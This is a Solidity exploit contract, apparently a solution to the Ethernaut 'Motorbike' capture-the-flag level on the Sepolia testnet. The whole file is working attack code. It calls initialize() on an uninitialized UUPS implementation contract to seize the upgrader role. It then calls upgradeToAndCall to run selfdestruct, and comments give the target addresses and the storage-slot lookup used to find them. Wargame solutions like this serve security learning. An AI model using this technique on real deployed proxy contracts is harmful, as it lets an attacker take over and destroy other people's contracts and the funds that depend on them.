// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

// Motorbike contract (0x5Da2D6EdFcE8C411Be957e109524D56658Ccd35D)                    
// is a proxy contract that delegates calls to the engine contract.

// Engine (implementation) contract (0x0fE5D6cf6cBc49a3ce61fdE297fC335451FB1757)
// await web3.eth.getStorageAt(contract.address, '0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc')
// https://sepolia.etherscan.io/address/0x0fe5d6cf6cbc49a3ce61fde297fc335451fb1757

interface IEngine {
    function initialize() external;
    function upgrader() external view returns (address);
    function upgradeToAndCall(address newImplementation, bytes calldata data) external;
}

contract MotorbikeAttack {
    IEngine engine;

    constructor(address _engine) public {
        engine = IEngine(_engine);
    }

    function attack() external {
        engine.initialize();
        engine.upgradeToAndCall(address(this), abi.encodeWithSelector(this.destruct.selector));
    }

    function destruct() external {
        selfdestruct(address(0));
    }
}
